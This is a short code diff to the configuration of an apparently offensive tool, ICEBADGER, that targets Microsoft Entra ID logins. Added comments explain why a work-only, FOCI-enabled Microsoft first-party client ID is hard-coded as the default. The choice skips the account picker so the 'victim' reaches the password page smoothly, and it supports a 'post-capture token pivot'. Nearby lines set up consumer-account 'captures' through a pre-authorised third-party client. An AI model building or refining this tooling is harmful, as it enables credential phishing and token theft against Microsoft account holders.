@@ -13,7 +13,17 @@ class Config:
     DB_PATH = str((BASE_DIR / _raw_db).resolve()) if not os.path.isabs(_raw_db) else _raw_db
     
     # Microsoft Entra ID Specifics
-    CLIENT_ID = os.getenv("ICEBADGER_CLIENT_ID")
+    # Work/school capture client. MUST be a work-only first-party client.
+    # The Microsoft Authentication Broker (29d9ed98) advertises support for
+    # BOTH work and personal accounts, so Entra inserts the "Work or school
+    # account / Personal account" picker after the email step. Picking the
+    # work tile then redirects to sts.microsoftonline.com, a host that no
+    # longer resolves (NXDOMAIN), so the victim lands on a cert/DNS error and
+    # has to start over. Outlook Mobile (27922004) is work-only, so the
+    # picker never appears and the flow goes straight to the password page.
+    # It is also FOCI-enabled, which the post-capture token pivot relies on.
+    CLIENT_ID = os.getenv("ICEBADGER_CLIENT_ID",
+                          "27922004-5251-4030-b22d-91ecd9a37ea4")
     # Public client used for personal (consumer) captures.
     # Mozilla Thunderbird: a genuine third-party public client that Microsoft
     # has pre-authorised for Graph Mail scopes AND that supports personal
